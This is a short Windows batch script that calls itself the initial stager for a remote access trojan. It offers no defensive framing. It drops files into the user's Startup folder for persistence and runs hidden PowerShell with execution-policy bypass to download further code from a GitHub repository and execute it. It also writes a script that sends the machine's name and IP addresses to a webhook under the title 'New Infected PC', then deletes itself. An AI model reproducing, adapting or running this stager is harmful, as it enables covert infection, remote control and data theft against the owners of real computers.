@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM create Webhookfile
(
    echo $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress
    echo $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Wlan*).IPAddress
    echo $hookUrl = "Webhooklink"
    echo $description = "@
    echo     Computer Name = $env:computername
    echo     Ethernet IP = $ipEthernet
    echo     WLan IP = $ipWlan
    echo @"
    echo $payload = [PSCustomObject]@{ Title="New Infected PC" Description=$description }
    echo Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)
) > webhook.ps1
@REM run payload
powershell ./wget.cmd

@REM cd change back to initial location
cd "%INITIALPATH%"
del initial.cmd